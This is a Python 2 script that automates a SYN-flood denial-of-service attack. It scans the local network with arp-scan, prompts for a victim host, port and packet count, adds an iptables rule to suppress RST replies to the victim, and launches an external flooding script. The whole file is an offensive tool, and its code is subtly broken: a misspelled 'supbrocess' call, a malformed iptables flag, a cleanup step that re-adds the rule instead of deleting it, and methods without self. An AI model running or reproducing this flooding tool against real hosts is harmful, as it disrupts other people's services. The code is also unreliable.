######
# Module:   SYN-Flooding
# Author:   S.Schuster
# Date:     2015/11/14
# Version:  1.0
#
# Description: Script for automation SYN-Flooding on HTTP-Connections against
# self-defined host
#
###############################
# Log:
# 2015/11/14    S.S - Initial
# 2015/11/14    S.S - Done
################################


import os
import subprocess
import attackBase

class SYNFlooding(attackBase.Attack):
	
	host = "127.0.0.1"
	interface = "eth0"
	port = "80"
	amount = "100"

	def start():

		print "### SNY-Flooding ### \n\n"
		print "Available interfaces: \n"
		subprocess.call(["ls", "/sys/class/net"])
                interface = raw_input("\nSelect interface: ")

		print "\n Scan hosts (LAN) ..."
                subprocess.call(["arp-scan", "--interface="+interface,  "--localnet"])

                print "Insert host from LAN that should be attacked \n"
		host = raw_input("Host-IP: ")

		print "Insert (TCP)-Port that should be flooded \n"
		port = raw_input("Port: (e.g. 80(http), 443 (https)")

		print "Insert number of SYN-Packets that should be sent to host (X for unlimited \”")
		amount = raw_input("Number of SYN-Packets: ")

		 # add iptaple-rule for OUTPUT that no RST-Flag will be sent to attacked host
                subprocess.call(["iptables", "-A", "OUTPUT", "-p", "tcp", "-d", host, "-tcp-flags", "RST", "RST", "-j", "DROP"])

		print "SYN-Flooding is starting now ..."
		supbrocess.Popen(["sudo", "python", "flooding.py", "-d", host, "-c", amount, "-p", port])

		# delete iptables-rules after syn-flooding is finished
		subprocess.call(["iptables", "-A", "OUTPUT", "-p", "tcp", "-d", host, "-tcp-flags", "RST", "RST", "-j", "DROP"])



	def help():
		print "ToDo 14-11-2015"
		
